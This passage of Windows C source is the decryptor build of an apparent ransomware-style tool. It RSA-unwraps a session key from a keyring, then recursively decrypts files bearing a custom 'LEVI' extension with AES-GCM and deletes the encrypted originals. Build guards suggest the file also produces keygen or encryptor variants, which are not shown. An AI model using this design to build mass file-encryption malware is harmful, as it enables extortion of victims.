                if (rsa_unwrap(priv, priv_len, p, wlen, sk, AES_KEY_LEN, &outLen)
                    && outLen == AES_KEY_LEN) {
                    wprintf(L"[+] Session key recovered via slot %lu\n",
                            (unsigned long)slot_idx);
                    found = TRUE;
                }
                SecureZeroMemory(priv, priv_len);
                free(priv);
            }
        }
        p += wlen;
    }

    SecureZeroMemory(buf, sz);
    free(buf);
    return found;
}

static BOOL unwrap_file_key(const uint8_t *sk, const uint8_t in[WRAPPED_KEY_LEN],
                            uint8_t fk[AES_KEY_LEN])
{
    const uint8_t *iv  = in;
    const uint8_t *ct  = in + AES_IV_LEN;
    const uint8_t *tag = in + AES_IV_LEN + AES_KEY_LEN;

    GCM_CTX ctx;
    if (!gcm_start(&ctx, sk, iv, tag)) return FALSE;
    ULONG ptLen = 0;
    BOOL ok = gcm_dec_chunk(&ctx, ct, AES_KEY_LEN, fk, &ptLen, TRUE)
              && ptLen == AES_KEY_LEN;
    gcm_end(&ctx);
    return ok;
}

static BOOL decrypt_file(const WCHAR *path, const uint8_t *sk) {
    HANDLE hIn = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                             OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hIn == INVALID_HANDLE_VALUE) return FALSE;

    LARGE_INTEGER sz;
    if (!GetFileSizeEx(hIn, &sz) || sz.QuadPart <= (LONGLONG)TRAILER_LEN) {
        CloseHandle(hIn);
        return FALSE;
    }
    uint64_t total = (uint64_t)sz.QuadPart;

    uint8_t trailer[TRAILER_LEN];
    LARGE_INTEGER off; off.QuadPart = (LONGLONG)(total - TRAILER_LEN);
    if (!SetFilePointerEx(hIn, off, NULL, FILE_BEGIN)) {
        CloseHandle(hIn);
        return FALSE;
    }

    DWORD rd = 0;
    if (!ReadFile(hIn, trailer, TRAILER_LEN, &rd, NULL) || rd != TRAILER_LEN) {
        CloseHandle(hIn);
        return FALSE;
    }
    uint8_t *p = trailer;
    uint8_t iv_k[AES_IV_LEN];          memcpy(iv_k, p, AES_IV_LEN);          p += AES_IV_LEN;
    uint8_t tag_k[AES_TAG_LEN];        memcpy(tag_k, p, AES_TAG_LEN);        p += AES_TAG_LEN;
    uint64_t pt_size = 0;              memcpy(&pt_size, p, 8);               p += 8;
    uint8_t wrapped[WRAPPED_KEY_LEN];  memcpy(wrapped, p, WRAPPED_KEY_LEN);  p += WRAPPED_KEY_LEN;
    uint64_t magic = 0;                memcpy(&magic, p, 8);

    if (magic != TRAILER_MAGIC) { CloseHandle(hIn); return FALSE; }

    uint8_t fk[AES_KEY_LEN] = {0};
    if (!unwrap_file_key(sk, wrapped, fk)) {
        SecureZeroMemory(fk, AES_KEY_LEN);
        CloseHandle(hIn);
        return FALSE;
    }

    uint64_t ct_size = total - TRAILER_LEN;
    if (ct_size != pt_size) {
        SecureZeroMemory(fk, AES_KEY_LEN);
        CloseHandle(hIn);
        return FALSE;
    }

    WCHAR dst[MAX_PATH];
    if (FAILED(StringCchCopyW(dst, MAX_PATH, path))) {
        SecureZeroMemory(fk, AES_KEY_LEN);
        CloseHandle(hIn);
        return FALSE;
    }
    size_t dl = wcslen(dst);
    if (dl > LEVI_EXT_LEN && _wcsicmp(dst + dl - LEVI_EXT_LEN, LEVI_EXT) == 0)
        dst[dl - LEVI_EXT_LEN] = 0;

    WCHAR tmp[MAX_PATH];
    if (FAILED(StringCchPrintfW(tmp, MAX_PATH, L"%ls.lev_dec_tmp", dst))) {
        SecureZeroMemory(fk, AES_KEY_LEN);
        CloseHandle(hIn);
        return FALSE;
    }
    HANDLE hOut = CreateFileW(tmp, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                              FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOut == INVALID_HANDLE_VALUE) {
        SecureZeroMemory(fk, AES_KEY_LEN);
        CloseHandle(hIn);
        return FALSE;
    }

    LARGE_INTEGER zero; zero.QuadPart = 0;
    if (!SetFilePointerEx(hIn, zero, NULL, FILE_BEGIN)) {
        CloseHandle(hIn); CloseHandle(hOut); DeleteFileW(tmp);
        SecureZeroMemory(fk, AES_KEY_LEN);
        return FALSE;
    }

    GCM_CTX ctx;
    if (!gcm_start(&ctx, fk, iv_k, tag_k)) {
        CloseHandle(hIn); CloseHandle(hOut); DeleteFileW(tmp);
        SecureZeroMemory(fk, AES_KEY_LEN);
        return FALSE;
    }

    uint8_t *buf_in  = (uint8_t *)malloc(CHUNK_SIZE);
    uint8_t *buf_out = (uint8_t *)malloc(CHUNK_SIZE);
    BOOL ok = (buf_in && buf_out);
    uint64_t done = 0;

    while (ok && done < ct_size) {
        DWORD want = (DWORD)((ct_size - done < CHUNK_SIZE) ? (ct_size - done) : CHUNK_SIZE);
        DWORD got = 0;
        if (!ReadFile(hIn, buf_in, want, &got, NULL) || got != want) { ok = FALSE; break; }
        done += got;
        BOOL final = (done == ct_size);
        ULONG ptLen = 0;
        if (!gcm_dec_chunk(&ctx, buf_in, got, buf_out, &ptLen, final)) { ok = FALSE; break; }
        DWORD wr = 0;
        if (!WriteFile(hOut, buf_out, ptLen, &wr, NULL) || wr != ptLen) { ok = FALSE; break; }
    }

    if (buf_in)  { SecureZeroMemory(buf_in, CHUNK_SIZE);  free(buf_in); }
    if (buf_out) { SecureZeroMemory(buf_out, CHUNK_SIZE); free(buf_out); }

    gcm_end(&ctx);
    CloseHandle(hIn);
    CloseHandle(hOut);
    SecureZeroMemory(fk, AES_KEY_LEN);
    SecureZeroMemory(iv_k, AES_IV_LEN);
    SecureZeroMemory(tag_k, AES_TAG_LEN);
    SecureZeroMemory(wrapped, WRAPPED_KEY_LEN);

    if (!ok) { DeleteFileW(tmp); return FALSE; }

    if (!MoveFileExW(tmp, dst, MOVEFILE_REPLACE_EXISTING)) {
        DeleteFileW(tmp);
        return FALSE;
    }
    best_effort_delete(path);
    return TRUE;
}

static void walk_and_decrypt(const WCHAR *dir, const uint8_t *sk, int depth) {
    if (depth > MAX_DEPTH) return;

    WCHAR pattern[MAX_PATH];
    if (FAILED(StringCchPrintfW(pattern, MAX_PATH, L"%ls\\*", dir))) return;

    WIN32_FIND_DATAW fd;
    HANDLE hf = FindFirstFileW(pattern, &fd);
    if (hf == INVALID_HANDLE_VALUE) return;

    do {
        if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0) continue;

        WCHAR full[MAX_PATH];
        if (FAILED(StringCchPrintfW(full, MAX_PATH, L"%ls\\%ls", dir, fd.cFileName)))
            continue;

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) continue;
            walk_and_decrypt(full, sk, depth + 1);
        } else {
            size_t n = wcslen(fd.cFileName);
            if (n > LEVI_EXT_LEN
                && _wcsicmp(fd.cFileName + n - LEVI_EXT_LEN, LEVI_EXT) == 0) {
                if (decrypt_file(full, sk))
                    wprintf(L"[+] Decrypted %ls\n", full);
                else
                    wprintf(L"[-] Failed: %ls\n", full);
            }
        }
    } while (FindNextFileW(hf, &fd));

    FindClose(hf);
}

int wmain(int argc, wchar_t **argv) {
    if (_setmode(_fileno(stdout), _O_U16TEXT) == -1 ||
        _setmode(_fileno(stderr), _O_U16TEXT) == -1) {
        fwprintf(stderr, L"[-] failed to set U16 console mode\n");
        return 1;
    }

    if (argc < 3) {
        fwprintf(stderr, L"Usage: %ls <root_dir> <privkey_dir>\n", argv[0]);
        return 1;
    }
    const WCHAR *root    = argv[1];
    const WCHAR *privdir = argv[2];

    WCHAR keyring[MAX_PATH];
    if (FAILED(StringCchPrintfW(keyring, MAX_PATH, L"%ls\\%ls", root, KEYRING_NAME))) {
        fwprintf(stderr, L"[-] keyring path too long\n");
        return 2;
    }

    uint8_t sk[AES_KEY_LEN] = {0};
    if (!recover_session_key(keyring, privdir, sk)) {
        fwprintf(stderr, L"[-] Could not recover session key\n");
        SecureZeroMemory(sk, AES_KEY_LEN);
        return 3;
    }

    walk_and_decrypt(root, sk, 0);
    SecureZeroMemory(sk, AES_KEY_LEN);
    wprintf(L"[+] Done.\n");
    return 0;
}

#endif  /* DECRYPTOR_BUILD */
#endif  /* !KEYGEN_BUILD */